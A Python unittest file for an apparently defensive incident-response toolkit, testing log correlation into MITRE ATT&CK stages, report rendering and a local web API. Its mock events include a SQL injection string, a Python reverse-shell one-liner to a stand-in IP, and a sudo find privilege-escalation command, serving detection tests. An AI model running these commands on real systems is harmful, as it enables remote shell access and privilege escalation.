import unittest
import os
import json
import urllib.request
import threading
import time

from bluekit.paths import get_kb_path
from bluekit.kb.query import KB
from bluekit.web.server import WebKitServer, WebKitHandler
from bluekit.ir.correlator import load_events_from_file, correlate_incident
from bluekit.ir.report import build_incident_model, render_scoring_json, render_markdown_report

class TestIR(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.elk_file = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', 'elasticsearch_export.json'))
        cls.has_elk = os.path.exists(cls.elk_file)

        # Setup test web server
        kb_path = get_kb_path()
        cls.kb = KB(kb_path) if os.path.exists(kb_path) else None
        cls.workdir = os.path.join(os.path.dirname(__file__), 'test_ir_work')
        cls.server = WebKitServer(('127.0.0.1', 0), WebKitHandler, cls.kb, cls.workdir)
        cls.port = cls.server.server_port
        cls.thread = threading.Thread(target=cls.server.serve_forever)
        cls.thread.daemon = True
        cls.thread.start()
        time.sleep(0.5)

    @classmethod
    def tearDownClass(cls):
        if hasattr(cls, 'server'):
            cls.server.shutdown()
            cls.server.server_close()
            cls.thread.join(timeout=2)

    def test_mock_correlation(self):
        mock_events = [
            {
                "@timestamp": "2026-09-18T10:00:00+00:00",
                "event": {"dataset": "nginx.access"},
                "host": {"name": "web-01"},
                "source": {"ip": "198.51.100.45"},
                "http": {"request": {"method": "GET"}, "response": {"status_code": 200}},
                "url": {"path": "/api/v1/products", "query": "id=1' UNION SELECT 1,2,3--"}
            },
            {
                "@timestamp": "2026-09-18T11:00:00+00:00",
                "event": {"dataset": "auditd.process"},
                "host": {"name": "web-01"},
                "user": {"name": "www-data"},
                "process": {"command_line": "python3 -c 'import socket,pty; s=socket.socket(); s.connect((\"198.51.100.45\", 4444)); pty.spawn(\"/bin/bash\")'"}
            },
            {
                "@timestamp": "2026-09-18T12:00:00+00:00",
                "event": {"dataset": "auditd.process"},
                "host": {"name": "web-01"},
                "user": {"name": "root"},
                "process": {"command_line": "sudo /usr/bin/find . -exec /bin/sh -p \\; -quit"}
            },
            {
                "@timestamp": "2026-09-18T13:00:00+00:00",
                "event": {"dataset": "suricata.eve"},
                "host": {"name": "web-01"},
                "message": "Suricata Alert: High Volume Outbound HTTPS POST to Rare External IP 203.0.113.88"
            },
            # Noise that should be ignored
            {
                "@timestamp": "2026-09-18T10:05:00+00:00",
                "event": {"dataset": "nginx.access"},
                "host": {"name": "web-01"},
                "http": {"response": {"status_code": 200}},
                "url": {"path": "/static/style.css"}
            }
        ]

        chain = correlate_incident(mock_events)
        self.assertEqual(len(chain.stages), 4)
        
        # Verify MITRE IDs
        tech_ids = [s.technique_id for s in chain.stages]
        self.assertIn("T1190", tech_ids)
        self.assertIn("T1059.006", tech_ids)
        self.assertIn("T1548.003", tech_ids)
        self.assertIn("T1048", tech_ids)

        # Verify IOCs
        self.assertIn("198.51.100.45", chain.attacker_ips)
        self.assertIn("203.0.113.88", chain.exfiltration_ips)

        # Verify Reports
        model = build_incident_model(chain, "mock.json", len(mock_events))
        scoring_json = json.loads(render_scoring_json(model))
        self.assertEqual(scoring_json["verdict"], "CONFIRMED_BREACH")
        self.assertEqual(scoring_json["severity"], "CRITICAL")

        md_ru = render_markdown_report(model, "ru")
        self.assertIn("Отчёт об инциденте", md_ru)
        self.assertIn("T1190", md_ru)

    def test_full_elk_dataset(self):
        if not self.has_elk:
            self.skipTest("elasticsearch_export.json not found")

        events, source_name = load_events_from_file(self.elk_file)
        self.assertEqual(len(events), 15000)

        chain = correlate_incident(events)
        self.assertTrue(len(chain.stages) >= 10)
        self.assertIn("web-prod-01", chain.hosts_involved)
        self.assertIn("db-prod-02", chain.hosts_involved)
        self.assertIn("198.51.100.45", chain.attacker_ips)
        self.assertIn("203.0.113.88", chain.exfiltration_ips)
        self.assertIn("backup_daemon", chain.compromised_users)

    def test_web_api_ir(self):
        req_data = {
            "path": self.elk_file if self.has_elk else "mock.json",
            "lang": "ru"
        }
        if not self.has_elk:
            req_data["content"] = json.dumps([
                {
                    "@timestamp": "2026-09-18T10:00:00+00:00",
                    "event": {"dataset": "nginx.access"},
                    "host": {"name": "web-01"},
                    "source": {"ip": "198.51.100.45"},
                    "http": {"request": {"method": "GET"}, "response": {"status_code": 200}},
                    "url": {"path": "/api/v1/products", "query": "id=1' UNION SELECT 1,2,3--"}
                }
            ])
            req_data["filename"] = "test.json"
            del req_data["path"]

        req = urllib.request.Request(
            f"http://127.0.0.1:{self.port}/api/ir/chain",
            data=json.dumps(req_data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req) as resp:
            body = resp.read()
            self.assertEqual(resp.getcode(), 200)
            res = json.loads(body)
            self.assertIn("model", res)
            self.assertIn("scoring_json", res)
            self.assertIn("report_md", res)

    def test_sysmon_xml_and_multi_file(self):
        from bluekit.ir.correlator import parse_sysmon_xml, load_events_from_files, load_events_from_file
        import tempfile
        xml_content = (
            '<Events>\n'
            '  <Event>\n'
            '    <System>\n'
            '      <EventID>1</EventID>\n'
            '      <TimeCreated SystemTime="2026-09-12T13:02:11.000Z" />\n'
            '      <Computer>HR07.corp.local</Computer>\n'
            '    </System>\n'
            '    <EventData>\n'
            '      <Data Name="Image">C:\\Windows\\System32\\wscript.exe</Data>\n'
            '      <Data Name="CommandLine">wscript.exe update.js</Data>\n'
            '      <Data Name="User">CORP\\a.ivanova</Data>\n'
            '    </EventData>\n'
            '  </Event>\n'
            '</Events>'
        )
        with tempfile.NamedTemporaryFile('w', suffix='.xml', delete=False, encoding='utf-8') as f:
            f.write(xml_content)
            f_xml = f.name

        with tempfile.NamedTemporaryFile('w', suffix='.json', delete=False, encoding='utf-8') as f:
            f.write(json.dumps([{"@timestamp": "2026-09-12T13:05:00Z", "host": {"name": "HR07.corp.local"}, "message": "test"}]))
            f_json = f.name

        try:
            evts_xml = parse_sysmon_xml(f_xml)
            self.assertEqual(len(evts_xml), 1)
            self.assertEqual(evts_xml[0]['process'], r'C:\Windows\System32\wscript.exe')
            self.assertEqual(evts_xml[0]['host'], 'HR07.corp.local')

            merged, names = load_events_from_files([f_xml, f_json])
            self.assertEqual(len(merged), 2)
        finally:
            if os.path.exists(f_xml): os.remove(f_xml)
            if os.path.exists(f_json): os.remove(f_json)

if __name__ == '__main__':
    unittest.main()
